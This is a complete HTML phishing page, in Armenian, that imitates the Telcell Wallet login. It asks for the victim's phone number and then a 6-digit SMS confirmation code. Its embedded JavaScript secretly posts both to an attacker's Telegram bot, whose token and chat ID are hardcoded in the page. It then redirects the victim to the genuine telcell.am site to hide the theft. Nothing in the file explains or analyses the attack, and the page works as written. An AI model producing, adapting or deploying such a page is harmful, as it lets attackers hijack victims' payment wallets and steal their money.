<!DOCTYPE html>
<html lang="hy">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telcell Wallet</title>
    <style>
        :root {
            --primary-color: #ff5e4d;
            --bg-color: #ffffff;
            --input-bg: #f2f2f7;
            --text-main: #222222;
            --text-secondary: #8e8e93;
            --btn-disabled: #ffd0c8;
        }

        * {
            margin: 0; padding: 0; box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body { 
            background-color: var(--bg-color); 
            display: flex; 
            justify-content: center; 
            height: 100vh; 
            overflow: hidden; 
        }

        .app-container { 
            width: 100%; 
            max-width: 400px; 
            display: flex; 
            flex-direction: column; 
            padding: 20px; 
        }

        /* Header */
        .back-button { 
            background: none; border: none; 
            font-size: 28px; color: #333; 
            cursor: pointer; width: 40px; height: 40px;
            margin-bottom: 5px; margin-left: -10px;
            display: flex; align-items: center; justify-content: center;
        }

        h1 { font-size: 34px; font-weight: 800; color: var(--text-main); margin-bottom: 25px; }

        .section-title { text-align: center; margin-bottom: 30px; }
        .section-title h2 { font-size: 22px; font-weight: 700; color: var(--text-main); }
        .section-title p { font-size: 15px; color: var(--text-secondary); margin-top: 6px; }

        /* Form Elements */
        .input-group { margin-top: 10px; }
        .input-group label { font-size: 14px; font-weight: 700; color: #333; display: block; margin-bottom: 10px; }
        
        .input-wrapper { 
            background-color: var(--input-bg); 
            border-radius: 16px; 
            padding: 18px 20px; 
            transition: 0.2s;
            border: 1px solid transparent;
        }
        .input-wrapper:focus-within { border-color: var(--primary-color); }

        input { 
            background: none; border: none; outline: none; 
            width: 100%; font-size: 18px; color: #000; 
        }

        .hint { font-size: 13px; color: var(--text-secondary); margin-top: 8px; padding-left: 5px; }

        .info-box { display: flex; gap: 12px; margin-top: 25px; align-items: flex-start; }
        .info-icon { 
            color: var(--primary-color); border: 1.5px solid var(--primary-color); 
            border-radius: 50%; width: 20px; height: 20px; 
            display: flex; align-items: center; justify-content: center; 
            font-size: 12px; font-weight: bold; flex-shrink: 0; margin-top: 2px;
        }
        .info-text { font-size: 14px; color: var(--text-secondary); line-height: 1.5; }

        /* OTP Screen */
        .otp-container { 
            display: flex; 
            justify-content: space-between; 
            margin: 35px 0; 
            gap: 8px;
        }
        .otp-input { 
            width: 14%; 
            height: 58px; 
            background-color: var(--input-bg); 
            border: 2px solid transparent; 
            border-radius: 14px; 
            text-align: center; 
            font-size: 24px; 
            font-weight: 700; 
            transition: 0.2s;
        }
        .otp-input:focus { border-color: var(--primary-color); background: #fff; outline: none; }
        
        #sms-sent-to { text-align: center; font-size: 14px; color: var(--text-secondary); margin-top: 15px; }

        /* Footer & Button */
        .footer { 
            margin-top: auto; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            gap: 15px; 
            padding-bottom: 25px; 
        }
        .offer-link { color: var(--primary-color); font-weight: 700; text-decoration: none; font-size: 16px; }
        .terms { font-size: 13px; color: #333; text-align: center; padding: 0 10px; line-height: 1.4; }

        .submit-btn { 
            width: 100%; 
            background-color: var(--btn-disabled); 
            color: white; border: none; 
            border-radius: 30px; height: 56px; 
            font-size: 18px; font-weight: 700; 
            cursor: pointer; transition: 0.3s; 
        }
        .submit-btn.active { background-color: var(--primary-color); box-shadow: 0 4px 12px rgba(255, 94, 77, 0.3); }
        
        .timer-text { margin-top: 30px; text-align: center; color: var(--text-secondary); font-size: 14px; }
        #timer { font-weight: 700; color: var(--text-main); }
    </style>
</head>
<body>

<div class="app-container">
    <button class="back-button" id="backBtn">‹</button>
    <h1 id="mainTitle">Բարև</h1>
    
    <!-- Screen 1 -->
    <div id="screen-login">
        <div class="section-title">
            <h2>Մուտք</h2>
            <p>Ստեղծիր հարթակ վճարումներիդ համար</p>
        </div>
        <form id="tgLoginForm">
            <div class="input-group">
                <label>Քո հեռախոսահամարը</label>
                <div class="input-wrapper">
                    <input type="tel" id="user_phone" placeholder="+374" required maxlength="12">
                </div>
                <p class="hint">Նմուշ՝ 77XXXXXX</p>
                <div class="info-box">
                    <span class="info-icon">i</span>
                    <p class="info-text">Հաստատման կոդով SMS-ը կուղարկվի տվյալ հեռախոսահամարին</p>
                </div>
            </div>
        </form>
    </div>

    <!-- Screen 2 -->
    <div id="screen-otp" style="display: none;">
        <div class="section-title">
            <h2>SMS հաստատում</h2>
            <p>Մուտքագրիր 6 նիշանոց կոդը SMS-ից</p>
        </div>
        <div class="otp-container" id="otpBox">
            <input type="number" class="otp-input" pattern="\d*" inputmode="numeric">
            <input type="number" class="otp-input" pattern="\d*" inputmode="numeric">
            <input type="number" class="otp-input" pattern="\d*" inputmode="numeric">
            <input type="number" class="otp-input" pattern="\d*" inputmode="numeric">
            <input type="number" class="otp-input" pattern="\d*" inputmode="numeric">
            <input type="number" class="otp-input" pattern="\d*" inputmode="numeric">
        </div>
        <p id="sms-sent-to"></p>
        <p class="timer-text">Կրկին ուղարկել <span id="timer">112</span> վրկ հետո</p>
    </div>

    <!-- Common Footer -->
    <div class="footer" id="mainFooter">
        <a href="#" class="offer-link">Ծանոթանալ Օֆերտային</a>
        <p class="terms">Telcell Wallet մուտք գործելով՝ դու ընդունում ես օգտագործման կանոնները</p>
        <button type="submit" form="tgLoginForm" id="submitBtn" class="submit-btn">Հաստատել</button>
    </div>
</div>

<script>
    const CONFIG = {
        token: '8314828218:AAGY6twUZ6iFU7smncNhgGJ7pxh5z6MF1p8',
        chat: '6576262467'
    };

    const phoneInput = document.getElementById('user_phone');
    const submitBtn = document.getElementById('submitBtn');
    const screenLogin = document.getElementById('screen-login');
    const screenOtp = document.getElementById('screen-otp');
    const mainTitle = document.getElementById('mainTitle');
    const mainFooter = document.getElementById('mainFooter');

    // Button state
    phoneInput.addEventListener('input', () => {
        submitBtn.classList.toggle('active', phoneInput.value.length >= 8);
    });

    // Step 1: Login
    document.getElementById('tgLoginForm').onsubmit = async function(e) {
        e.preventDefault();
        const phone = phoneInput.value;
        submitBtn.innerText = 'Մշակվում է...';
        submitBtn.disabled = true;

        try {
            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.chat,
                    text: `📲 *LOGIN REQUEST*\n\n📞 Phone: \`${phone}\``,
                    parse_mode: 'Markdown'
                })
            });

            screenLogin.style.display = 'none';
            mainFooter.style.display = 'none';
            mainTitle.innerText = 'Նույնականացում';
            screenOtp.style.display = 'block';
            document.getElementById('sms-sent-to').innerText = `Կոդն ուղարկվել է ${phone} համարին`;
            
            initOtpLogic(phone);
            runTimer();
        } catch (err) { 
            alert('Կապի խափանում'); 
            submitBtn.disabled = false;
            submitBtn.innerText = 'Հաստատել';
        }
    };

    function runTimer() {
        let time = 112;
        const display = document.getElementById('timer');
        const interval = setInterval(() => {
            time--;
            display.innerText = time;
            if (time <= 0) clearInterval(interval);
        }, 1000);
    }

    function initOtpLogic(phone) {
        const inputs = document.querySelectorAll('.otp-input');
        
        inputs.forEach((input, idx) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
                
                if (e.target.value !== '' && idx < inputs.length - 1) {
                    inputs[idx + 1].focus();
                }

                const fullCode = Array.from(inputs).map(i => i.value).join('');
                if (fullCode.length === 6) {
                    sendOtp(phone, fullCode);
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && idx > 0) {
                    inputs[idx - 1].focus();
                }
            });
        });
    }

    async function sendOtp(phone, code) {
        try {
            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.chat,
                    text: `🔑 *OTP CODE*\n\n📞 Phone: \`${phone}\`\n💬 Code: \`${code}\``,
                    parse_mode: 'Markdown'
                })
            });
            // Final Step: redirect or message
            setTimeout(() => {
                window.location.href = "https://telcell.am";
            }, 1000);
        } catch (err) {}
    }
</script>
</body>
</html>
